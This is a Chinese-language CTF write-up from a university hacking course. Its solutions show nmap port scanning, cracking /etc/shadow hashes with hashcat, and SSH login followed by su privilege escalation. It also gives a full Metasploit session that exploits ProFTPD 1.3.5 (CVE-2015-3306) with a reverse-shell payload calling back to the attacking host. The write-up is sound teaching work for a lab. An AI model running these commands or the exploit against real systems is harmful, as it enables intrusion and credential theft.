+</span></span><span class="line"><span class="cl">            <span class="n">ciphertext</span> <span class="o">=</span> <span class="n">raw</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\r\n</span><span class="s1">&#39;</span><span class="p">)[</span><span class="mi">7</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="c1"># 用 mod 的方式重複 padding xor_key</span>
+</span></span><span class="line"><span class="cl">            <span class="n">res</span> <span class="o">=</span> <span class="p">[</span> <span class="n">word</span> <span class="o">^</span> <span class="n">xor_key</span><span class="p">[</span><span class="n">idx</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">xor_key</span><span class="p">)]</span> <span class="k">for</span> <span class="n">idx</span><span class="p">,</span> <span class="n">word</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">)</span> <span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="n">img</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">img</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="n">res</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">            <span class="n">img</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>成功把所有圖片 dump 出來，會發現有分兩種檔名，分別是 0-27 還有 時間戳記，剩下就是慢慢拼 Flag 了!!
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/image%200x2/pic/03.png"
+        data-srcset="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/image%200x2/pic/03.png, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/image%200x2/pic/03.png 1.5x, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/image%200x2/pic/03.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/image%200x2/pic/03.png"
+        title=" " /></p>
+<h2 id="pwn">Pwn</h2>
+<h3 id="hashmeow-120-points-2-solves">hashmeow (120 points, 2 solves)</h3>
+<h4 id="description-3">Description</h4>
+<p>macacahub.tw 又多開了一個 port 提供 ssh<br>
+你想要進來拿flag嗎？<br>
+想要的話可以全部給你&hellip; 去找吧！我把所有的帳密都放在檔案裡了</p>
+<div class="details admonition tip open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-lightbulb fa-fw" aria-hidden="true"></i>Tip<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><p><strong>hint 1</strong>: 檔案從該提供ssh服務的主機掉出來的</p>
+<p><strong>hint 2</strong>: 10k-most-common.txt 不錯用</p>
+<p><strong>hint 3</strong>: port_number &gt; 1000 &amp;&amp; port_number != 8778 &amp;&amp; port_number != htcf.ports.port_number</p>
+<p><strong>hint 4</strong>: flag在linux某個權限為1777的神奇目錄下</p>
+<p><strong>hint 5</strong>: 運氣也是種實力</p>
+</div>
+        </div>
+    </div>
+<h4 id="solution-3">Solution</h4>
+<p>如果有寫過 htcf 的練習題應該知道掃 port 的起手式就是 nmap，掃描查看 Domain 底下開了哪些 port 的服務 (其中 <code>-p-</code> 等同 <code>-p 0-65535</code>)。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ nmap -p- macacahub.tw
+</span></span><span class="line"><span class="cl">$ nmap -sV -p <span class="m">55555</span> macacahub.tw
+</span></span></code></pre></div><p>根據 hint 3 ，我們可以知道目標 port 是 55555，再進一步利用 <code>-sV</code> 查到是 ssh 服務（hint 1），結果如下。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/hashmeow/pic/01.png"
+        data-srcset="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/hashmeow/pic/01.png, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/hashmeow/pic/01.png 1.5x, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/hashmeow/pic/01.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/hashmeow/pic/01.png"
+        title=" " /></p>
+<p>找到連線入口，接下來我們需要 ssh 連線的帳號密碼。<br>
+從題目給的 passwd 和 shadow 其實就是存放密碼的檔案，只不過是被 Hash 過的 (可參考 <a href="https://www.cyberciti.biz/faq/understanding-etcshadow-file/" target="_blank" rel="noopener noreffer ">相關文章</a>），如果想知道更細節內容可以去翻 <a href="http://linux.vbird.org/linux_basic/mandrake9/0410accountmanager.php" target="_blank" rel="noopener noreffer ">鳥哥的私房菜 - 帳號與身份管理</a>，總之這裡我們需要想辦法把密碼爆破出來!!</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/hashmeow/pic/03.png"
+        data-srcset="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/hashmeow/pic/03.png, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/hashmeow/pic/03.png 1.5x, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/hashmeow/pic/03.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/hashmeow/pic/03.png"
+        title=" " /></p>
+<p>根據 hint 2，可以找到字典檔 <a href="https://github.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt" target="_blank" rel="noopener noreffer ">10k-most-common.txt</a> 並下載至本機端。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/hashmeow/pic/02.png"
+        data-srcset="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/hashmeow/pic/02.png, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/hashmeow/pic/02.png 1.5x, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/hashmeow/pic/02.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/hashmeow/pic/02.png"
+        title=" " /></p>
+<p>再來就是用 <code>hashcat</code> 這個密碼還原工具，題目的 hashmeow 其實就是在暗示這個XDDDD 可參考 hashcat 相關文章，要注意的是 shadow 內的 $6$ 是指 SHA-512，指令要對應到 <code>-m 1800</code>，另外結尾要掛上 <code>--show</code> 不然會沒有結果（笑），針對 shadow 使用 hashcat 可以找到兩組密碼，分別是 root:root 和 shelly:shelly，真的是<strong>弱密碼</strong>欸&hellip; 原來是 hint 5 的部分啊。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/hashmeow/pic/04.png"
+        data-srcset="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/hashmeow/pic/04.png, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/hashmeow/pic/04.png 1.5x, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/hashmeow/pic/04.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/hashmeow/pic/04.png"
+        title=" " /></p>
+<p>接著就是要嘗試用 shelly 的帳號登入（平常並不會有人直接用 root 登入，雖然這題預設也鎖 root 登入）。<br>
+最後就是在裡頭找 Flag 啦，根據 hint 4，可以 Google 發現 1777 權限分數其實指的就是 <code>/tmp</code> 目錄，細節同樣可參考 <a href="https://linux.vbird.org/linux_basic_train/centos7/unit05.php" target="_blank" rel="noopener noreffer ">鳥哥私房菜 - 權限應用、程序之觀察與基本管理</a>，進到 <code>/tmp</code> 找到 secret 資料夾後輕鬆拿 Flag。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/hashmeow/pic/05.png"
+        data-srcset="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/hashmeow/pic/05.png, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/hashmeow/pic/05.png 1.5x, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/hashmeow/pic/05.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/hashmeow/pic/05.png"
+        title=" " /></p>
+<h3 id="hashmeow-root-50-points-1-solve">hashmeow root (50 points, 1 solve)</h3>
+<h4 id="description-4">Description</h4>
+<p>與hashmeow同題目<br>
+但是flag在root的家裡</p>
+<h4 id="solution-4">Solution</h4>
+<p>承接上題的作法，分數比較低的原因是 Flag 單純放不同資料夾而已 XD
+回到根目錄<code>/</code>，並且根據提示移動到 root 目錄會發現權限不足，就連 <code>sudo</code> 也不能用QQ 不過有一招基本的提權方式是 <code>sudo su</code>，那我們可以從 <code>bin</code> 目錄找到 <code>su</code> 並且直接執行，被要求輸入的root密碼就是我們剛剛透過 hashcat 爆出來的 root:root，輕鬆提權!!!</p>
+<p>剩下就只是回 <code>/root</code>，拿 Flag !!</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/hashmeow/pic/06.png"
+        data-srcset="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/hashmeow/pic/06.png, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/hashmeow/pic/06.png 1.5x, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/hashmeow/pic/06.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/hashmeow/pic/06.png"
+        title=" " /></p>
+<h3 id="proftpd-120-points-0-solve">ProFTPD (120 points, 0 solve)</h3>
+<h4 id="description-5">Description</h4>
+<p>區網中有一個FTP伺服器，好像有漏洞來著(網路遮罩255.255.255.0，不是 xxx.xxx.xxx.1那台主機)</p>
+<p>請先ssh遠端連線至攻擊用主機(同CTF平台初始的帳號密碼) 接著在攻擊機的區網中找出有漏洞的主機 並且exploit有漏洞的主機 最後取得&quot;/var/www/html/_backup&quot;目錄下的flag檔</p>
+<p><code>ssh -p 8778 {你的帳號}@macacahub.tw</code></p>
+<p><strong>hint</strong>: 建議修改預設LPORT</p>
+<h4 id="solution-5">Solution</h4>
+<p>登入&quot;攻擊用主機&quot;後，根據題目描述要從區網中找出有漏洞的主機（也提示 FTP Server），先找到目前主機的 IP ，再透過 nmap 掃區網。<br>
+以本題為例，IP 為 172.30.0.3，則區網掃描可以用 <code>172.30.0.0/24</code> 或是 <code>172.30.0.*</code>，先確認 FTP 主機存在再查看版本細項，暴力一點可以直接用 <code>nmap -A 172.30.0.0/24</code> 一次把細節全部列出來。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/ProFTPD/pic/01.png"
+        data-srcset="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/ProFTPD/pic/01.png, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/ProFTPD/pic/01.png 1.5x, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/ProFTPD/pic/01.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/ProFTPD/pic/01.png"
+        title=" " /></p>
+<p>可以找到該 FTP Server 的版本為 <code>ProFTPD 1.3.5</code>，可以從 Google 發現有漏洞編號 <strong>CVE-2015-3306</strong>，那就是用上課所學的 Metasploit Framework 嘗試針對這個漏洞進行攻擊。 &hellip;沒錯!! 現在登入的這台&quot;攻擊用主機&quot;已經把你把相關工具都裝好了，可以直接下 <code>msfconsole</code> 來找關於漏洞相關的工具，如果懶得從 Google 找漏洞編號，也可以直接在 msf 搜尋 <code>ProFTPD 1.3.5</code> 相關攻擊工具。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/ProFTPD/pic/02.png"
+        data-srcset="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/ProFTPD/pic/02.png, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/ProFTPD/pic/02.png 1.5x, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/ProFTPD/pic/02.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/ProFTPD/pic/02.png"
+        title=" " /></p>
+<p>剩下就是工具使用，如果有寫課堂作業應該知道基本的操作方式..吧XD<br>
+參數的設定上 RHOST 目標IP為 nmap 掃出來的 172.30.0.2，SITEPATH 為題目描述的 <code>/var/www/html/</code>（我們其實沒有權限存取 <code>_backup</code>），這題還需要設定 payloads&hellip; 而且並不是每一組 payload 都能成功需要一點運氣，不過數量也不多把 payload 全部戳一遍也蠻快der。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/ProFTPD/pic/03.png"
+        data-srcset="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/ProFTPD/pic/03.png, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/ProFTPD/pic/03.png 1.5x, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/ProFTPD/pic/03.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/ProFTPD/pic/03.png"
+        title=" " /></p>
+<p>設定完 payload 後記得要再確認一次 options，把 LHOST 補上&quot;攻擊用主機&quot;，以便打過去的 reverse shell 才能順利彈回來，若攻擊成功就能拿到 FTP Server 的 shell，剩下就是把 flag 撈出來，結束。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/ProFTPD/pic/04.png"
+        data-srcset="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/ProFTPD/pic/04.png, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/ProFTPD/pic/04.png 1.5x, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/ProFTPD/pic/04.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/ProFTPD/pic/04.png"
+        title=" " /></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ ifconfig <span class="c1">#查看當前主機ip: 172.30.0.3</span>
+</span></span><span class="line"><span class="cl">$ nmap 172.30.0.0/24 <span class="c1">#掃區網，找到 FTP 主機(ip 172.30.0.2, port 21)</span>
+</span></span><span class="line"><span class="cl">$ nmap -sV -p <span class="m">21</span> 172.30.0.2 <span class="c1">#查看剛主機細部資訊，發現是ProFTPD 1.3.5</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">$ msfconsole
+</span></span><span class="line"><span class="cl">msf5 &gt; search ProFTPD 1.3.5
+</span></span><span class="line"><span class="cl">msf5 &gt; use unix/ftp/proftpd_modcopy_exec
+</span></span><span class="line"><span class="cl">msf5 exploit<span class="o">(</span>unix/ftp/proftpd_modcopy_exec<span class="o">)</span> &gt; show options
+</span></span><span class="line"><span class="cl">msf5 exploit<span class="o">(</span>unix/ftp/proftpd_modcopy_exec<span class="o">)</span> &gt; <span class="nb">set</span> RHOST &lt;target_ip&gt;
+</span></span><span class="line"><span class="cl">msf5 exploit<span class="o">(</span>unix/ftp/proftpd_modcopy_exec<span class="o">)</span> &gt; <span class="nb">set</span> SITEPATH &lt;target_directory&gt;
+</span></span><span class="line"><span class="cl">msf5 exploit<span class="o">(</span>unix/ftp/proftpd_modcopy_exec<span class="o">)</span> &gt; show payloads
+</span></span><span class="line"><span class="cl">msf5 exploit<span class="o">(</span>unix/ftp/proftpd_modcopy_exec<span class="o">)</span> &gt; <span class="nb">set</span> payload cmd/unix/reverse_perl
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">msf5 exploit<span class="o">(</span>unix/ftp/proftpd_modcopy_exec<span class="o">)</span> &gt; show options
+</span></span><span class="line"><span class="cl">msf5 exploit<span class="o">(</span>unix/ftp/proftpd_modcopy_exec<span class="o">)</span> &gt; <span class="nb">set</span> LHOST &lt;localhost_ip&gt;
+</span></span><span class="line"><span class="cl">msf5 exploit<span class="o">(</span>unix/ftp/proftpd_modcopy_exec<span class="o">)</span> &gt; exploit
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">(</span>reverse shell<span class="o">)</span>
+</span></span><span class="line"><span class="cl">ls 
+</span></span><span class="line"><span class="cl">ls _backup
+</span></span><span class="line"><span class="cl">cat _backup/f1aaag.txt
+</span></span></code></pre></div></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2020-11-09</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/nsysu-%E9%A7%AD%E5%AE%A2%E6%94%BB%E9%98%B2/">NSYSU 駭客攻防</a>,&nbsp;<a href="/tags/ctf-writeup/">CTF-Writeup</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/2020/nsysu-htcf-hw1/" class="prev" rel="prev" title="[NSYSU 駭客攻防] HW 0x01 Writeup"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>[NSYSU 駭客攻防] HW 0x01 Writeup</a>
+            <a href="/posts/2020/nsysu-htcf-hw2/" class="next" rel="next" title="[NSYSU 駭客攻防] HW 0x02 Writeups">[NSYSU 駭客攻防] HW 0x02 Writeups<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+<div id="comments"><div id="utterances" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://utteranc.es/">utterances</a>.
+            </noscript></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.134.3">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://blog.cyris.tw" target="_blank">Cyris Tseng</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":20},"comment":{"utterances":{"darkTheme":"github-dark","issueTerm":"pathname","label":"Comment 💬","lightTheme":"github-light","repo":"yctseng1227/blog-comments"}}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
